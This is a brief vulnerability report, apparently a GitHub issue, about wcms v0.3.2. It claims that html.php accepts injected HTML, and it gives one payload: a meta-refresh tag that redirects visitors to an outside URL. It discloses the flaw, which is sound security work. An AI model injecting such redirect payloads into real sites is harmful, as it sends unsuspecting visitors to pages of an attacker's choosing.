#### BUG_AUTHOR:acmglz
# wcms has contains any url jump
## Download address:
https://github.com/vedees/wcms/releases/tag/0.3.2
## Version:v0.3.2
## Tested on: PHP, Apache, MySQL
## Affected Page:
/wcms/wex/html.php

payload: 

```
<meta http-equiv=refresh content=2,url=http://www.baidu.com>
```



## Proof of vulnerability:

![image](https://github.com/user-attachments/assets/fa51f480-1012-49de-9916-286b254488a2)


1. Access: /wcms/
![image](https://github.com/user-attachments/assets/a3e0e558-de0b-45ed-8d19-e755785950d6)






